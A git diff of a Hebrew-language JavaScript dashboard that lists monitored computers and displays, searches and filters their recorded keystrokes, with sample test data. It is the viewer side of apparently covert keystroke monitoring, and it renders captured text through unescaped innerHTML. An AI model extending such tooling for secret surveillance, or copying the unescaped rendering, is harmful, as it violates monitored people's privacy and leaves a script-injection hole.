@@ -1,173 +1,258 @@
-let isRecording = false;
+const API_URL = 'http://127.0.0.1:5000/api';
 
-function startRecording() {
-    const button = event.target;
-    if (!isRecording) {
-        isRecording = true;
-        button.style.backgroundColor = '#f44336';
-        button.innerHTML = 'מקליט... <div class="loading"></div>';
-        showNotification("הקלטה הופעלה!");
+const computersContainer = document.getElementById('computer-list');
+
+const computers = new Map();
+
+// נתוני בדיקה
+const testComputers = [
+    {
+        name: "מחשב-בדיקה-1",
+        ip: "192.168.1.101",
+        location: "חדר פיתוח",
+        status: "פעיל",
+        lastActive: new Date().toLocaleString(),
+        keystrokes: [
+            {
+                window: "Visual Studio Code",
+                timestamp: new Date().toISOString(),
+                keystroke: "פיתוח מודול חדש למערכת"
+            },
+            {
+                window: "Chrome",
+                timestamp: new Date(Date.now() - 1500000).toISOString(),
+                keystroke: "חיפוש פתרונות בגוגל"
+            }
+        ]
+    },
+    {
+        name: "מחשב-בדיקה-2",
+        ip: "192.168.1.102",
+        location: "חדר בדיקות",
+        status: "פעיל",
+        lastActive: new Date().toLocaleString(),
+        keystrokes: [
+            {
+                window: "Microsoft Word",
+                timestamp: new Date().toISOString(),
+                keystroke: "כתיבת מסמך אפיון"
+            },
+            {
+                window: "Teams",
+                timestamp: new Date(Date.now() - 3600000).toISOString(),
+                keystroke: "פגישת צוות שבועית"
+            }
+        ]
     }
-}
+];
 
-function stopRecording() {
-    const recordButton = document.querySelector('button');
-    if (isRecording) {
-        isRecording = false;
-        recordButton.style.backgroundColor = '';
-        recordButton.textContent = 'הפעל הקלטה';
-        showNotification("הקלטה נעצרה!");
-    }
-}
+// Initialize event listeners
+document.addEventListener('DOMContentLoaded', () => {
+    // אתחול ראשוני
+    initializeApp();
+    
+    // הוספת מאזינים לחיפוש
+    setupSearchListeners();
+});
 
-function search() {
-    const searchBox = document.getElementById('search-box');
-    const searchTerm = searchBox.value;
-    searchBox.insertAdjacentHTML('afterend', '<div class="loading"></div>');
-    setTimeout(() => {
-        const loadingEl = document.querySelector('.loading');
-        if (loadingEl) loadingEl.remove();
-        showNotification("מחפש: " + searchTerm);
-    }, 1000);
-}
-
-// פותח פופ-אפ למחשב
-function openPopup(computerName) {
-    const popup = document.getElementById('popup');
-    const popupContent = popup.querySelector('.popup-content');
-    const popupTitle = document.getElementById('popup-title');
-    popup.style.display = 'block';
-    popup.classList.add('active');
-    popupTitle.textContent = computerName;
-    document.body.style.overflow = 'hidden';
-    requestAnimationFrame(() => {
-        popupContent.style.transform = 'translateY(0)';
-        popupContent.style.opacity = '1';
+function initializeApp() {
+    document.getElementById('computer-list').innerHTML = '';
+    
+    testComputers.forEach(computer => {
+        computers.set(computer.name, computer);
+        addComputerToList(computer);
     });
+
+    initDatePickers();
 }
 
-// סוגר את הפופ-אפ
-function closePopup() {
-    const popup = document.getElementById('popup');
-    const popupContent = popup.querySelector('.popup-content');
-    popupContent.style.transform = 'translateY(20px)';
-    popupContent.style.opacity = '0';
-    popup.classList.remove('active');
-    setTimeout(() => {
-        popup.style.display = 'none';
-        document.body.style.overflow = 'auto';
-    },300);
-}
+function setupSearchListeners() {
+    // חיפוש גלובלי
+    ['window-filter', 'content-filter'].forEach(id => {
+        const input = document.getElementById(id);
+        input.addEventListener('keyup', (e) => {
+            if (e.key === 'Enter') search(true);
+        });
+    });
 
-// חיפוש בפופ-אפ
-function searchPopup() {
-    const searchBox = document.getElementById('popup-search');
-    const searchTerm = searchBox.value;
-    searchBox.insertAdjacentHTML('afterend', '<div class="loading"></div>');
-    setTimeout(() => {
-        const loadingEl = document.querySelector('.loading');
-        if (loadingEl) loadingEl.remove();
-        showNotification("מחפש בתוך המחשב: " + searchTerm);
-    },1000);
-}
+    // חיפוש במחשב ספציפי
+    ['computer-window-filter', 'computer-content-filter'].forEach(id => {
+        const input = document.getElementById(id);
+        input.addEventListener('keyup', (e) => {
+            if (e.key === 'Enter') searchComputerData(true);
+        });
+    });
 
-function addButtonRippleEffect() {
-    document.querySelectorAll('button').forEach(button => {
-        button.addEventListener('click', e => {
-            const ripple = document.createElement('span');
-            ripple.classList.add('ripple');
-            button.appendChild(ripple);
-            const rect = button.getBoundingClientRect();
-            const x = e.clientX - rect.left;
-            const y = e.clientY - rect.top;
-            ripple.style.left = x + 'px';
-            ripple.style.top = y + 'px';
-            setTimeout(() => ripple.remove(), 600);
+    // מעקב אחרי שינוי תאריכים
+    ['start-date', 'end-date'].forEach(id => {
+        const input = document.getElementById(id);
+        input.addEventListener('change', () => search(true));
+    });
+
+    // הוספת מאזיני לחיצה לאייקוני לוח השנה
+    document.querySelectorAll('.calendar-trigger').forEach(icon => {
+        icon.addEventListener('click', (e) => {
+            const input = e.target.previousElementSibling;
+            if (input && input.type === 'datetime-local') {
+                input.showPicker();
+            }
         });
     });
 }
 
-function goToStats() {
-    window.location.href = 'stats.html';
+// פונקציות עזר
+function addComputerToList(computer) {
+    const computerElement = document.createElement('div');
+    computerElement.className = 'computer';
+    computerElement.innerHTML = `
+        <i class="fas fa-laptop"></i>
+        <span>${computer.name}</span>
+        <div class="computer-status">${computer.status}</div>
+    `;
+    computerElement.onclick = () => showComputerDetails(computer.name);
+    document.getElementById('computer-list').appendChild(computerElement);
 }
 
-function showNotification(message) {
-    const notification = document.createElement('div');
-    notification.className = 'notification';
-    notification.textContent = message;
-    document.body.appendChild(notification);
-    setTimeout(() => {
-        notification.classList.add('show');
-    }, 100);
-    setTimeout(() => {
-        notification.classList.remove('show');
-        setTimeout(() => {
-            notification.remove();
-        }, 500);
-    }, 3000);
+function showComputerDetails(computerName) {
+    const computer = computers.get(computerName);
+    if (!computer) return;
+
+    document.getElementById('computer-name-title').textContent = computer.name;
+    
+    const computerInfo = document.querySelector('.computer-info');
+    computerInfo.innerHTML = `
+        <p><strong>שם:</strong> ${computer.name}</p>
+        <p><strong>IP:</strong> ${computer.ip}</p>
+        <p><strong>מיקום:</strong> ${computer.location}</p>
+        <p><strong>סטטוס:</strong> ${computer.status}</p>
+        <p><strong>פעילות:</strong> ${computer.lastActive}</p>
+    `;
+    
+    showComputerKeystrokes(computer);
+    document.getElementById('computer-details-popup').style.display = 'block';
 }
 
-function addUser() {
-    const userName = prompt("הכנס שם משתמש:");
-    if (userName) {
-        const userTable = document.getElementById('user-table');
-        const newRow = userTable.insertRow();
-        const cell1 = newRow.insertCell(0);
-        const cell2 = newRow.insertCell(1);
-        cell1.textContent = userName;
-        cell2.innerHTML = '<button onclick="removeUser(this)">הסר</button>';
-        showNotification("משתמש נוסף בהצלחה!");
+function showComputerKeystrokes(computer) {
+    if (!computer.keystrokes) return;
+    
+    const container = document.getElementById('computer-search-results');
+    container.innerHTML = '';
+    
+    computer.keystrokes.forEach(entry => {
+        const div = document.createElement('div');
+        div.className = 'keystroke-entry';
+        div.innerHTML = `
+            <div class="keystroke-window">${entry.window}</div>
+            <div class="keystroke-time">${new Date(entry.timestamp).toLocaleString()}</div>
+            <div class="keystroke-data">${entry.keystroke}</div>
+        `;
+        container.appendChild(div);
+    });
+}
+
+// פונקציות חיפוש
+// פונקציית חיפוש גלובלית מעודכנת
+function search(isButtonClick = false) {
+    const windowText = document.getElementById('window-filter').value.toLowerCase();
+    const contentText = document.getElementById('content-filter').value.toLowerCase();
+    const startDate = new Date(document.getElementById('start-date').value || '1970-01-01');
+    const endDate = new Date(document.getElementById('end-date').value || '2100-01-01');
+
+    const results = Array.from(computers.values())
+        .flatMap(computer => computer.keystrokes
+            .filter(entry => {
+                const entryDate = new Date(entry.timestamp);
+                return (!windowText || entry.window.toLowerCase().includes(windowText)) &&
+                       (!contentText || entry.keystroke.toLowerCase().includes(contentText)) &&
+                       entryDate >= startDate && entryDate <= endDate;
+            })
+            .map(entry => ({
+                computerName: computer.name,
+                ...entry
+            }))
+        );
+
+    displaySearchResults(results);
+}
+
+function searchComputerData(isButtonClick = false) {
+    const computerName = document.getElementById('computer-name-title').textContent;
+    const computer = computers.get(computerName);
+    if (!computer) return;
+
+    const windowText = document.getElementById('computer-window-filter').value.toLowerCase();
+    const contentText = document.getElementById('computer-content-filter').value.toLowerCase();
+    const startDate = new Date(document.getElementById('computer-start-date').value || '1970-01-01');
+    const endDate = new Date(document.getElementById('computer-end-date').value || '2100-01-01');
+
+    const results = computer.keystrokes.filter(entry => {
+        const entryDate = new Date(entry.timestamp);
+        return (!windowText || entry.window.toLowerCase().includes(windowText)) &&
+               (!contentText || entry.keystroke.toLowerCase().includes(contentText)) &&
+               entryDate >= startDate && entryDate <= endDate;
+    });
+
+    displayComputerSearchResults(results);
+}
+
+function displaySearchResults(results) {
+    const container = document.getElementById('search-results');
+    container.innerHTML = '';
+    
+    if (results.length === 0) {
+        container.innerHTML = '<div class="no-results">לא נמצאו תוצאות</div>';
+    } else {
+        results.forEach(entry => {
+            const div = document.createElement('div');
+            div.className = 'keystroke-entry';
+            div.innerHTML = `
+                <div class="keystroke-window">${entry.window}</div>
+                <div class="keystroke-time">${new Date(entry.timestamp).toLocaleString()}</div>
+                <div class="computer-name">מחשב: ${entry.computerName}</div>
+                <div class="keystroke-data">${entry.keystroke}</div>
+            `;
+            container.appendChild(div);
+        });
+    }
+    
+    // הצגת הפופ-אפ
+    document.getElementById('search-results-popup').style.display = 'block';
+}
+
+function displayComputerSearchResults(results) {
+    const container = document.getElementById('computer-search-results');
+    container.innerHTML = '';
+    
+    if (results.length === 0) {
+        container.innerHTML = '<div class="no-results">לא נמצאו תוצאות</div>';
+    } else {
+        results.forEach(entry => {
+            const div = document.createElement('div');
+            div.className = 'keystroke-entry';
+            div.innerHTML = `
+                <div class="keystroke-window">${entry.window}</div>
+                <div class="keystroke-time">${new Date(entry.timestamp).toLocaleString()}</div>
+                <div class="keystroke-data">${entry.keystroke}</div>
+            `;
+            container.appendChild(div);
+        });
     }
 }
 
-function removeUser(button) {
-    const row = button.parentNode.parentNode;
-    row.parentNode.removeChild(row);
-    showNotification("משתמש הוסר בהצלחה!");
+// פונקציות תאריכים
+function initDatePickers() {
+    const now = new Date();
+    ['start-date', 'end-date', 'computer-start-date', 'computer-end-date'].forEach(id => {
+        const picker = document.getElementById(id);
+        if (picker) picker.valueAsDate = now;
+    });
 }
 
-document.addEventListener('DOMContentLoaded', addButtonRippleEffect);
-
-window.onclick = function(e) {
-    const popup = document.getElementById('popup');
-    if (e.target == popup) closePopup();
-};
-
-let settings = {
-    autoRefresh: true,
-    notificationsEnabled: true,
-    updateInterval: 5000
-};
-
-function openSettings() {
-    document.getElementById('settingsPanel').classList.add('open');
+// פונקציות סגירה
+function closeComputerDetails() {
+    document.getElementById('computer-details-popup').style.display = 'none';
 }
 
-function toggleAutoRefresh() {
-    settings.autoRefresh = !settings.autoRefresh;
-    showAlert(`רענון אוטומטי ${settings.autoRefresh ? 'הופעל' : 'כובה'}`);
+function closeSearchResults() {
+    document.getElementById('search-results-popup').style.display = 'none';
 }
-
-function toggleNotifications() {
-    settings.notificationsEnabled = !settings.notificationsEnabled;
-    showAlert(`התראות ${settings.notificationsEnabled ? 'הופעלו' : 'כובו'}`);
-}
-
-function changeUpdateInterval(interval) {
-    settings.updateInterval = parseInt(interval);
-    showAlert(`תדירות העדכון שונתה ל-${interval/1000} שניות`);
-}
-
-function showAlert(message) {
-    const alert = document.getElementById('alertBox');
-    alert.textContent = message;
-    alert.classList.add('show');
-    setTimeout(() => alert.classList.remove('show'), 3000);
-}
-
-// Initialize dark mode from localStorage
-document.addEventListener('DOMContentLoaded', () => {
-    if (localStorage.getItem('darkMode') === 'true') {
-        document.body.classList.add('dark-mode');
-    }
-});
